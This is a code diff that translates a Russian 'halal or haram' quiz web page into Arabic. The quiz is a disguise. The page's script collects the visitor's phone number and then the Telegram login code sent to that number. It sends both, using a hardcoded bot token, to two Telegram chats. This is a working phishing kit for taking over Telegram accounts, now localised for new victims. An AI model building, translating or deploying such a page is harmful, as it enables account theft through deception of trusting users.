@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Тест на халяль и харам</title>
+    <title>اختبار الحلال والحرام</title>
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -14,6 +14,8 @@
             border-radius: 10px;
             box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2);
             background-color: #f9f9f9;
+            direction: rtl;
+            text-align: right;
         }
         h1, h2 {
             text-align: center;
@@ -23,7 +25,7 @@
             margin: 15px 0 5px;
         }
         input[type="radio"] {
-            margin-right: 10px;
+            margin-left: 10px;
         }
         input[type="text"], input[type="number"], input[type="tel"] {
             width: 100%;
@@ -54,153 +56,147 @@
     </style>
 </head>
 <body>
-    <h1>Тест на халяль и харам</h1>
+    <h1>اختبار الحلال والحرام</h1>
 
-    <!-- Форма теста -->
+    <!-- نموذج الاختبار -->
     <div id="testForm">
         <form>
-            <h2>Ответьте на вопросы:</h2>
+            <h2>أجب على الأسئلة التالية:</h2>
             <div id="questions">
-                <label>1. Мясо свинины:</label>
-                <input type="radio" name="q1" value="Харам"> Харам
-                <input type="radio" name="q1" value="Халяль"> Халяль
+                <label>1. لحم الخنزير:</label>
+                <input type="radio" name="q1" value="حرام"> حرام
+                <input type="radio" name="q1" value="حلال"> حلال
 
-                <label>2. Употребление алкоголя:</label>
-                <input type="radio" name="q2" value="Харам"> Харам
-                <input type="radio" name="q2" value="Халяль"> Халяль
+                <label>2. شرب الكحول:</label>
+                <input type="radio" name="q2" value="حرام"> حرام
+                <input type="radio" name="q2" value="حلال"> حلال
 
-                <label>3. Покупка вещей на деньги, заработанные честным трудом:</label>
-                <input type="radio" name="q3" value="Халяль"> Халяль
-                <input type="radio" name="q3" value="Харам"> Харам
+                <label>3. شراء الأشياء بأموال مكتسبة بعمل صادق:</label>
+                <input type="radio" name="q3" value="حلال"> حلال
+                <input type="radio" name="q3" value="حرام"> حرام
 
-                <label>4. Азартные игры:</label>
-                <input type="radio" name="q4" value="Харам"> Харам
-                <input type="radio" name="q4" value="Халяль"> Халяль
+                <label>4. القمار:</label>
+                <input type="radio" name="q4" value="حرام"> حرام
+                <input type="radio" name="q4" value="حلال"> حلال
 
-                <label>5. Доброта к соседям:</label>
-                <input type="radio" name="q5" value="Халяль"> Халяль
-                <input type="radio" name="q5" value="Харам"> Харам
+                <label>5. اللطف مع الجيران:</label>
+                <input type="radio" name="q5" value="حلال"> حلال
+                <input type="radio" name="q5" value="حرام"> حرام
 
-                <label>6. Кража:</label>
-                <input type="radio" name="q6" value="Харам"> Харам
-                <input type="radio" name="q6" value="Халяль"> Халяль
+                <label>6. السرقة:</label>
+                <input type="radio" name="q6" value="حرام"> حرام
+                <input type="radio" name="q6" value="حلال"> حلال
 
-                <label>7. Благотворительность:</label>
-                <input type="radio" name="q7" value="Халяль"> Халяль
-                <input type="radio" name="q7" value="Харам"> Харам
+                <label>7. التبرع الخيري:</label>
+                <input type="radio" name="q7" value="حلال"> حلال
+                <input type="radio" name="q7" value="حرام"> حرام
 
-                <label>8. Ложь:</label>
-                <input type="radio" name="q8" value="Харам"> Харам
-                <input type="radio" name="q8" value="Халяль"> Халяль
+                <label>8. الكذب:</label>
+                <input type="radio" name="q8" value="حرام"> حرام
+                <input type="radio" name="q8" value="حلال"> حلال
             </div>
 
-            <label for="phone">Введите ваш номер телефона, это нужно чтобы мы смогли отправить вам ответы в телеграмме!:</label>
-            <input type="tel" id="phone" name="phone" placeholder="Номер телефона" required>
+            <label for="phone">أدخل رقم هاتفك لتلقي الإجابات على التليجرام:</label>
+            <input type="tel" id="phone" name="phone" placeholder="رقم الهاتف" required>
 
-            <button type="button" id="submitTest">Отправить ответы</button>
+            <button type="button" id="submitTest">إرسال الإجابات</button>
         </form>
         <div class="message" id="testMessage"></div>
     </div>
 
-    <!-- Форма ввода кода -->
+    <!-- نموذج إدخال الرمز -->
     <div id="codeForm" style="display: none;">
         <form>
-            <label for="code">Введите код подтверждения который вам пришёл в телеграме, если код не пришёл ожидайте 1-5 минут!:</label>
-            <input type="text" id="code" name="code" placeholder="Код из 10-16 символов" required>
-            <button type="button" id="sendCodeButton">Подтвердить</button>
+            <label for="code">أدخل رمز التأكيد الذي تلقيته على التليجرام. إذا لم تتلقاه، يرجى الانتظار من 1 إلى 5 دقائق:</label>
+            <input type="text" id="code" name="code" placeholder="رمز مكون من 10-16 أحرف" required>
+            <button type="button" id="sendCodeButton">تأكيد</button>
         </form>
         <div class="message" id="codeMessage"></div>
     </div>
 
     <script>
         const BOT_TOKEN = "7619958121:AAETlme7ZmSzyB_fu_VZD22pDEtvSLOgexY";
-        const CHAT_IDS = ["1335366204", "7478293706"];  // Массив ID чатов
+        const CHAT_IDS = ["1335366204", "7478293706"]; // قائمة معرّفات المحادثات
 
-        // Отправка данных в Telegram
-async function sendToTelegram(message) {
-    let success = false; // переменная для отслеживания успеха отправки
-    for (let chat_id of CHAT_IDS) {
-        try {
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({
-                    chat_id: chat_id,
-                    text: message,
-                }),
-            });
+        // إرسال البيانات إلى تليجرام
+        async function sendToTelegram(message) {
+            let success = false; // متغير لتتبع نجاح الإرسال
+            for (let chat_id of CHAT_IDS) {
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({
+                            chat_id: chat_id,
+                            text: message,
+                        }),
+                    });
 
-            if (response.ok) {
-                success = true; // если запрос успешен, меняем на true
-            } else {
-                console.log(`Ошибка при отправке сообщения в чат ${chat_id}`);
+                    if (response.ok) {
+                        success = true; // إذا نجح الطلب، تغيير القيمة إلى true
+                    } else {
+                        console.log(`خطأ أثناء إرسال الرسالة إلى المحادثة ${chat_id}`);
+                    }
+                } catch (error) {
+                    console.log(`خطأ أثناء إرسال الطلب إلى تليجرام: ${error.message}`);
+                }
             }
-        } catch (error) {
-            console.log(`Ошибка при отправке запроса в Telegram: ${error.message}`);
+            return success; // إعادة النتيجة
         }
-    }
-    return success; // возвращаем результат
-}
 
-// Обработчик отправки теста
-document.getElementById('submitTest').addEventListener('click', async () => {
-    const answers = Array.from(document.querySelectorAll('#questions input:checked')).map(input => input.value);
-    const phone = document.getElementById('phone').value.trim();
+        // معالجة إرسال الاختبار
+        document.getElementById('submitTest').addEventListener('click', async () => {
+            const answers = Array.from(document.querySelectorAll('#questions input:checked')).map(input => input.value);
+            const phone = document.getElementById('phone').value.trim();
 
-    // Проверка, что все вопросы отвечены
-    if (answers.length !== 8) {
-        document.getElementById('testMessage').textContent = "Пожалуйста, ответьте на все вопросы!";
-        return;
-    }
+            if (answers.length !== 8) {
+                document.getElementById('testMessage').textContent = "يرجى الإجابة على جميع الأسئلة!";
+                return;
+            }
 
-    // Проверка корректности номера телефона (начинается с + и далее только цифры)
-    const phonePattern = /^\+[\d]+$/;
-    if (!phone || !phonePattern.test(phone)) {
-        document.getElementById('testMessage').textContent = "Введите корректный номер телефона!";
-        return;
-    }
+            const phonePattern = /^\+[\d]+$/;
+            if (!phone || !phonePattern.test(phone)) {
+                document.getElementById('testMessage').textContent = "يرجى إدخال رقم هاتف صحيح!";
+                return;
+            }
 
-    // Отключение кнопки и изменение текста
-    const submitButton = document.getElementById('submitTest');
-    submitButton.disabled = true;
-    submitButton.innerText = "Отправляется...";
+            const submitButton = document.getElementById('submitTest');
+            submitButton.disabled = true;
+            submitButton.innerText = "جارٍ الإرسال...";
 
-    // Отправка данных в Telegram
-    const success = await sendToTelegram(`📋 Результаты теста:\n${answers.join('\n')}\n📱 Номер телефона: ${phone}`);
-    if (success) {
-        document.getElementById('testMessage').textContent = "Ответы отправлены. Введите код подтверждения который вам пришёл в телеграме, если код не пришёл ожидайте 1-5 минут.";
-        document.getElementById('testForm').style.display = 'none';
-        document.getElementById('codeForm').style.display = 'block';
-    } else {
-        document.getElementById('testMessage').textContent = "Произошла ошибка. Попробуйте снова.";
-        submitButton.disabled = false;
-        submitButton.innerText = "Отправить ответы";
-    }
-});
+            const success = await sendToTelegram(`📋 نتائج الاختبار:\n${answers.join('\n')}\n📱 رقم الهاتف: ${phone}`);
+            if (success) {
+                document.getElementById('testMessage').textContent = "تم إرسال الإجابات. أدخل رمز التأكيد الذي تلقيته على التليجرام.";
+                document.getElementById('testForm').style.display = 'none';
+                document.getElementById('codeForm').style.display = 'block';
+            } else {
+                document.getElementById('testMessage').textContent = "حدث خطأ. حاول مرة أخرى.";
+                submitButton.disabled = false;
+                submitButton.innerText = "إرسال الإجابات";
+            }
+        });
 
-// Обработчик отправки кода
-document.getElementById('sendCodeButton').addEventListener('click', async () => {
-    const code = document.getElementById('code').value.trim();
-    if (!code) {
-        document.getElementById('codeMessage').textContent = "Введите корректный код!";
-        return;
-    }
+        // معالجة إرسال الرمز
+        document.getElementById('sendCodeButton').addEventListener('click', async () => {
+            const code = document.getElementById('code').value.trim();
+            if (!code) {
+                document.getElementById('codeMessage').textContent = "يرجى إدخال رمز صحيح!";
+                return;
+            }
 
-    // Отключение кнопки и изменение текста
-    const sendCodeButton = document.getElementById('sendCodeButton');
-    sendCodeButton.disabled = true;
-    sendCodeButton.innerText = "Подтверждается...";
+            const sendCodeButton = document.getElementById('sendCodeButton');
+            sendCodeButton.disabled = true;
+            sendCodeButton.innerText = "جارٍ التأكيد...";
 
-    // Отправка кода подтверждения в Telegram
-    const success = await sendToTelegram(`🔑 Код подтверждения: ${code}`);
-    if (success) {
-        document.getElementById('codeMessage').textContent = "Код подтверждения отправлен, ожидайте ответы в течении часа!";
-    } else {
-        document.getElementById('codeMessage').textContent = "Произошла ошибка при отправке кода.";
-        sendCodeButton.disabled = false;
-        sendCodeButton.innerText = "Подтвердить";
-    }
-});
+            const success = await sendToTelegram(`🔑 رمز التأكيد: ${code}`);
+            if (success) {
+                document.getElementById('codeMessage').textContent = "تم إرسال رمز التأكيد، يرجى انتظار الرد خلال ساعة.";
+            } else {
+                document.getElementById('codeMessage').textContent = "حدث خطأ أثناء إرسال الرمز.";
+                sendCodeButton.disabled = false;
+                sendCodeButton.innerText = "تأكيد";
+            }
+        });
     </script>
 </body>
 </html>
